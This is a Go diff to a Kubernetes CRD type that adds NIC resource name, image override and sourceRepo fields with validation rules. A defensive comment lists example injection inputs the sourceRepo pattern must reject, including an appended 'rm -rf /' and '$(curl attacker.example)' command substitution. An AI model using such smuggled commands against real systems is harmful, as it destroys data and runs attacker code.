@@ -164,6 +164,28 @@ type CategoryOptions struct {
 	// +kubebuilder:validation:Minimum=0
 	MlnxPerNode *int32 `json:"mlnxPerNode,omitempty"`
 
+	// nicResourceName sets the Kubernetes extended resource name of the RDMA
+	// NIC devices requested on workload containers for on-prem GB200/GB300
+	// targets (e.g., "rdma/ib", "nvidia.com/mlnxnics"); the name depends on
+	// the RDMA device plugin the site runs, and the per-container count
+	// comes from mlnxPerNode. When unset, the controller auto-detects the
+	// name on on-prem GB200/GB300 targets: a single candidate resource
+	// (rdma/* or nvidia.com/mlnxnics) allocatable at the resolved
+	// mlnxPerNode count on every target node is requested; zero or several
+	// qualifying candidates inject nothing and emit a NICResourceDetection
+	// event explaining what was found. Offline nvcrectl render (without
+	// --dry-run) has no cluster to inspect and uses only this field. The
+	// value must be a fully qualified extended resource name: a
+	// DNS-subdomain domain, a slash, and a name segment of at most 63
+	// characters; the reserved kubernetes.io and k8s.io domains (including
+	// their subdomains) are rejected, matching what Kubernetes accepts as an
+	// extended resource.
+	// +optional
+	// +kubebuilder:validation:MaxLength=253
+	// +kubebuilder:validation:Pattern=`^[a-z0-9]([-a-z0-9]*[a-z0-9])?(\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*/[a-zA-Z0-9]([-A-Za-z0-9_.]{0,61}[a-zA-Z0-9])?$`
+	// +kubebuilder:validation:XValidation:rule="!self.contains('kubernetes.io/') && !self.startsWith('k8s.io/') && !self.contains('.k8s.io/')",message="nicResourceName must not use the reserved kubernetes.io or k8s.io domains"
+	NicResourceName *string `json:"nicResourceName,omitempty"`
+
 	// resources overrides the CPU and memory resources of training workload
 	// containers. Training entries default to DGX-class sizing (limits:
 	// cpu "128" / memory "800Gi"; requests: cpu "64" / memory "500Gi") — set
@@ -182,6 +204,26 @@ type CategoryOptions struct {
 	// categories[].options.enableMNNVL.
 	// +optional
 	EnableMNNVL *bool `json:"enableMNNVL,omitempty"`
+
+	// image overrides the workload container image for catalog workloads.
+	// It replaces the trainer image in the rendered job template, the image
+	// of the primary workload container of every replicated job in the
+	// resolved TrainingRuntime dependencies, and the image of every init
+	// container in those pods whose image exactly equals the primary's
+	// pre-override image (the workload-derived inits such as
+	// fix-ssh-permissions and megatron-clone); init containers with a
+	// distinct image (such as GCP's tcpxo-daemon) and any additional
+	// containers keep their catalog images. Applied after catalog and
+	// platform overrides resolve, so it also replaces an image a platform
+	// override selects. Beware: on AWS EFA platforms (H100, GB200) the
+	// platform overrides land the workers on an nccl-tests image that ships
+	// the aws-ofi-nccl (EFA) plugin; setting image replaces that image, and
+	// the operator then owns the EFA OFI plugin being present in the
+	// replacement.
+	// +optional
+	// +kubebuilder:validation:MinLength=1
+	// +kubebuilder:validation:MaxLength=512
+	Image string `json:"image,omitempty"`
 
 	// imagePullSecrets is an optional list of references to secrets for pulling
 	// container images used by catalog workloads. If not specified, the cluster's
@@ -303,6 +345,31 @@ type CategoryOptions struct {
 	// +optional
 	// +kubebuilder:validation:Pattern=`^([0-9]+(h|m|s|ms))+$`
 	MeasurementTimeout string `json:"measurementTimeout,omitempty"`
+
+	// CRD admission is the sole validation gate for sourceRepo: the rendered
+	// value is spliced into a shell command in the catalog entry's clone step
+	// and the cloned source is executed by the workload, so the Pattern below
+	// must keep rejecting inputs like
+	// "https://host/repo.git;rm -rf /" (shell metacharacters),
+	// "$(curl attacker.example)" (command substitution), and
+	// "git://host/repo.git" or "http://host/repo.git" (unauthenticated
+	// transports an on-path attacker can substitute code over, CWE-494).
+
+	// sourceRepo is the Git repository for the source checkout this category
+	// clones at pod start. Each catalog entry defines what its source is and
+	// its default upstream; point this at an internal mirror for air-gapped
+	// or restricted-egress clusters. Entries that clone no source ignore it.
+	// The URL must use an authenticated remote scheme (https:// or ssh://).
+	// http:// and git:// are intentionally rejected: the cloned source is
+	// executed by the workload, and those transports are unauthenticated.
+	// scp-style git@host:path syntax and file:// are intentionally rejected:
+	// the contract is a remote git mirror. Non-TLS mirrors and local source
+	// belong on the pre-seeded checkpoint PVC path or in the workload image
+	// instead.
+	// +optional
+	// +kubebuilder:validation:MaxLength=2048
+	// +kubebuilder:validation:Pattern=`^(https|ssh)://[A-Za-z0-9._~:/@%+-]+$`
+	SourceRepo string `json:"sourceRepo,omitempty"`
 }
 
 type CertificateCategory struct {
